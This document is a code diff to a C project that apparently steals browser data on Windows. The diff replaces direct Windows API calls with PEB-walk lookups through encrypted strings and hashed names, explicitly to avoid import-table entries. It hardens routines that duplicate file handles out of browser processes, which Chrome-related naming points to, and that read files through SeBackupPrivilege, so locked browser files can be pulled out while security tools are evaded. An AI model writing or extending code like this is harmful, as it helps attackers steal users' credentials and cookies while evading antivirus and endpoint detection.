@@ -19,6 +19,7 @@
 #include "export_resolve.h"
 #include "hash.h"
 #include "peb.h"
+#include "enc_strings.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -59,6 +60,58 @@ typedef NTSTATUS (WINAPI *fnNtDupObj)(HANDLE, HANDLE, HANDLE *, HANDLE *, ULONG,
 typedef NTSTATUS (WINAPI *fnNtCreateSec)(HANDLE *, ULONG, PVOID, PVOID, ULONG, ULONG, HANDLE);
 typedef NTSTATUS (WINAPI *fnNtMapView)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PVOID, SIZE_T *, ULONG, ULONG, ULONG);
 typedef NTSTATUS (WINAPI *fnNtUnmapView)(HANDLE, PVOID);
+
+/* CloseHandle via PEB-walk (no IAT import) */
+typedef BOOL (WINAPI *pMirCloseHandle)(HANDLE);
+static pMirCloseHandle g_pCloseHandle = NULL;
+
+static BOOL mir_CloseHandle(HANDLE h) {
+    if (!g_pCloseHandle) {
+        char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+        void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+        if (!k32) return 0;
+        char fn[32]; enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
+        g_pCloseHandle = (pMirCloseHandle)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    }
+    return g_pCloseHandle ? g_pCloseHandle(h) : 0;
+}
+
+/* PEB-walk for kernel32: GetCurrentProcess, MultiByteToWideChar, GetFileAttributesA */
+typedef HANDLE (WINAPI *pMirGetCurrentProcess)(void);
+typedef int    (WINAPI *pMirMultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
+typedef DWORD  (WINAPI *pMirGetFileAttributesA)(LPCSTR);
+typedef DWORD  (WINAPI *pMirGetFinalPathNameByHandleW)(HANDLE, LPWSTR, DWORD, DWORD);
+typedef DWORD  (WINAPI *pMirGetFileSize)(HANDLE, LPDWORD);
+
+static struct {
+    pMirGetCurrentProcess    pGCP;
+    pMirMultiByteToWideChar  pMBTWC;
+    pMirGetFileAttributesA   pGFAA;
+    pMirGetFinalPathNameByHandleW pGFPNBHW;
+    pMirGetFileSize          pGFS;
+    int ready;
+} g_chrome_misc;
+
+static int chrome_misc_ensure(void) {
+    if (g_chrome_misc.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_GetCurrentProcess, ENC_GETCURRENTPROCESS_LEN, fn);
+    g_chrome_misc.pGCP = (pMirGetCurrentProcess)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_MultiByteToWideChar, ENC_MULTIBYTETOWIDECHAR_LEN, fn);
+    g_chrome_misc.pMBTWC = (pMirMultiByteToWideChar)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
+    g_chrome_misc.pGFAA = (pMirGetFileAttributesA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetFinalPathNameByHandleW, ENC_GETFINALPATHNAMEBYHANDLEW_LEN, fn);
+    g_chrome_misc.pGFPNBHW = (pMirGetFinalPathNameByHandleW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn);
+    g_chrome_misc.pGFS = (pMirGetFileSize)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_chrome_misc.pGCP || !g_chrome_misc.pMBTWC || !g_chrome_misc.pGFAA || !g_chrome_misc.pGFPNBHW || !g_chrome_misc.pGFS) return 0;
+    g_chrome_misc.ready = 1;
+    return 1;
+}
 
 /* SystemHandleInformation class (nt_query_system_information) */
 #define MIRAGE_SysHandleInfo  16
@@ -140,12 +193,14 @@ static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
     if (!pGNP||!pQIP||!pQSI||!pOP||!pCl||!pDup||!pCS||!pMV||!pUV)
         return NULL;
 
+    if (!chrome_misc_ensure()) return NULL;
+
     /* Wide-char target path for comparison */
-    int wcap = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
+    int wcap = g_chrome_misc.pMBTWC(CP_UTF8, 0, path, -1, NULL, 0);
     if (wcap <= 0 || wcap > MAX_PATH) return NULL;
     wchar_t *wtarget = (wchar_t *)malloc((size_t)wcap * sizeof(wchar_t));
     if (!wtarget) return NULL;
-    MultiByteToWideChar(CP_UTF8, 0, path, -1, wtarget, wcap);
+    g_chrome_misc.pMBTWC(CP_UTF8, 0, path, -1, wtarget, wcap);
 
     /* ── 1. Collect browser PIDs via NtGetNextProcess ──────── */
     #define MAX_BPIDS 32
@@ -212,7 +267,7 @@ static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
     }
 
     /* ── 3. Walk handles, find ours ───────────────────────── */
-    HANDLE hself = GetCurrentProcess();
+    HANDLE hself = g_chrome_misc.pGCP();
     for (ULONG i = 0; i < ht->NumberOfHandles && !result; i++) {
         MirHandleEntry *e = &ht->Handles[i];
 
@@ -241,7 +296,7 @@ static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
 
         /* Match by canonical path */
         wchar_t fpath[MAX_PATH + 4];
-        DWORD plen = GetFinalPathNameByHandleW(hdup, fpath, MAX_PATH, 0);
+        DWORD plen = g_chrome_misc.pGFPNBHW(hdup, fpath, MAX_PATH, 0);
         int matched = 0;
         if (plen > 0 && plen < MAX_PATH) {
             wchar_t *cmp = fpath;
@@ -252,7 +307,7 @@ static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
 
         if (matched) {
             /* Get exact file size (mapped pages are page-aligned) */
-            DWORD fsize = GetFileSize(hdup, NULL);
+            DWORD fsize = g_chrome_misc.pGFS(hdup, NULL);
             if (fsize != INVALID_FILE_SIZE && fsize > 0) {
                 HANDLE hsec = NULL;
                 st = pCS(&hsec, 0x0004 /*SECTION_MAP_READ*/,
@@ -275,7 +330,7 @@ static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
                 }
             }
         }
-        CloseHandle(hdup);
+        mir_CloseHandle(hdup);
     }
 
     free(ht);
@@ -341,12 +396,14 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
     fnNtUnmapView pUV  = (fnNtUnmapView)_mir_res(ntdll, "NtUnmapViewOfSection");
     if (!pOP || !pCl || !pDup || !pCS || !pMV || !pUV) return NULL;
 
+    if (!chrome_misc_ensure()) return NULL;
+
     /* Convert path to wide for RmRegisterResources */
-    int wcap = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
+    int wcap = g_chrome_misc.pMBTWC(CP_UTF8, 0, path, -1, NULL, 0);
     if (wcap <= 0) return NULL;
     wchar_t *wpath = (wchar_t *)malloc((size_t)wcap * sizeof(wchar_t));
     if (!wpath) return NULL;
-    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, wcap);
+    g_chrome_misc.pMBTWC(CP_UTF8, 0, path, -1, wpath, wcap);
 
     /* Start RM session */
     DWORD sess = 0;
@@ -379,7 +436,7 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
 
     /* For each locking PID, section-map the file via handle duplication */
     fnNtQSI pQSI = (fnNtQSI)_mir_res(ntdll, "NtQuerySystemInformation");
-    HANDLE hself = GetCurrentProcess();
+    HANDLE hself = g_chrome_misc.pGCP();
 
     for (UINT i = 0; i < pnProcInfo && !result; i++) {
         HANDLE hproc = NULL;
@@ -408,11 +465,11 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
         if (!ht) { pCl(hproc); continue; }
 
         /* Wide path for comparison */
-        int wcap2 = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
+        int wcap2 = g_chrome_misc.pMBTWC(CP_UTF8, 0, path, -1, NULL, 0);
         wchar_t *wtarget = NULL;
         if (wcap2 > 0) {
             wtarget = (wchar_t *)malloc((size_t)wcap2 * sizeof(wchar_t));
-            if (wtarget) MultiByteToWideChar(CP_UTF8, 0, path, -1, wtarget, wcap2);
+            if (wtarget) g_chrome_misc.pMBTWC(CP_UTF8, 0, path, -1, wtarget, wcap2);
         }
 
         for (ULONG j = 0; j < ht->NumberOfHandles && !result; j++) {
@@ -429,7 +486,7 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
             int matched = 0;
             if (wtarget) {
                 wchar_t fpath[MAX_PATH + 4];
-                DWORD plen = GetFinalPathNameByHandleW(hdup, fpath, MAX_PATH, 0);
+                DWORD plen = g_chrome_misc.pGFPNBHW(hdup, fpath, MAX_PATH, 0);
                 if (plen > 0 && plen < MAX_PATH) {
                     wchar_t *cmp = fpath;
                     if (cmp[0]==L'\\' && cmp[1]==L'\\' && cmp[2]==L'?' && cmp[3]==L'\\')
@@ -439,7 +496,7 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
             }
 
             if (matched) {
-                DWORD fsize = GetFileSize(hdup, NULL);
+                DWORD fsize = g_chrome_misc.pGFS(hdup, NULL);
                 if (fsize != INVALID_FILE_SIZE && fsize > 0) {
                     HANDLE hsec = NULL;
                     st = pCS(&hsec, 0x0004, NULL, NULL, 0x02, 0x08000000, hdup);
@@ -459,7 +516,7 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
                     }
                 }
             }
-            CloseHandle(hdup);
+            mir_CloseHandle(hdup);
         }
 
         free(wtarget);
@@ -490,6 +547,8 @@ typedef LPVOID (WINAPI *fnMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef BOOL   (WINAPI *fnUnmapViewOfFile)(LPCVOID);
 
 static unsigned char *read_file_backup(const char *path, size_t *out_len) {
+    if (!chrome_misc_ensure()) return NULL;
+
     /* Resolve advapi32.dll */
     void *advapi32 = mirage_get_module_by_hash(
         mirage_encrypted_hash_module("advapi32.dll"));
@@ -524,7 +583,7 @@ static unsigned char *read_file_backup(const char *path, size_t *out_len) {
 
     /* Enable SeBackupPrivilege + SeRestorePrivilege on current token */
     HANDLE htok = NULL;
-    if (!pOpenToken(GetCurrentProcess(),
+    if (!pOpenToken(g_chrome_misc.pGCP(),
                     0x0020 | 0x0008 /*TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY*/,
                     &htok)) {
         dbg_printf("[!] read_file_backup: OpenProcessToken failed\n");
@@ -563,27 +622,27 @@ static unsigned char *read_file_backup(const char *path, size_t *out_len) {
 
     if (hf == INVALID_HANDLE_VALUE) {
         dbg_printf("[!] read_file_backup: CreateFileA failed for %s\n", path);
-        CloseHandle(htok);
+        mir_CloseHandle(htok);
         return NULL;
     }
 
     DWORD fsize = pGetSize(hf, NULL);
     if (fsize == INVALID_FILE_SIZE || fsize == 0) {
-        CloseHandle(hf); CloseHandle(htok);
+        mir_CloseHandle(hf); mir_CloseHandle(htok);
         return NULL;
     }
 
     HANDLE hmap = pMapping(hf, NULL, 0x02 /*PAGE_READONLY*/, 0, 0, NULL);
     if (!hmap) {
         dbg_printf("[!] read_file_backup: CreateFileMappingA failed\n");
-        CloseHandle(hf); CloseHandle(htok);
+        mir_CloseHandle(hf); mir_CloseHandle(htok);
         return NULL;
     }
 
     LPVOID base = pMapView(hmap, 0x0004 /*FILE_MAP_READ*/, 0, 0, fsize);
     if (!base) {
         dbg_printf("[!] read_file_backup: MapViewOfFile failed\n");
-        CloseHandle(hmap); CloseHandle(hf); CloseHandle(htok);
+        mir_CloseHandle(hmap); mir_CloseHandle(hf); mir_CloseHandle(htok);
         return NULL;
     }
 
@@ -597,9 +656,9 @@ static unsigned char *read_file_backup(const char *path, size_t *out_len) {
     }
 
     pUnmap(base);
-    CloseHandle(hmap);
-    CloseHandle(hf);
-    CloseHandle(htok);
+    mir_CloseHandle(hmap);
+    mir_CloseHandle(hf);
+    mir_CloseHandle(htok);
 
     return buf;
 }
@@ -659,7 +718,8 @@ static char *path_join(const char *a, const char *b) {
 
 static int dir_exists(const char *path) {
 #ifdef _WIN32
-    DWORD attr = GetFileAttributesA(path);
+    if (!chrome_misc_ensure()) return 0;
+    DWORD attr = g_chrome_misc.pGFAA(path);
     return (attr != INVALID_FILE_ATTRIBUTES &&
             (attr & FILE_ATTRIBUTE_DIRECTORY));
 #else
@@ -672,7 +732,8 @@ static int dir_exists(const char *path) {
 
 static int file_exists(const char *path) {
 #ifdef _WIN32
-    DWORD attr = GetFileAttributesA(path);
+    if (!chrome_misc_ensure()) return 0;
+    DWORD attr = g_chrome_misc.pGFAA(path);
     return (attr != INVALID_FILE_ATTRIBUTES &&
             !(attr & FILE_ATTRIBUTE_DIRECTORY));
 #else
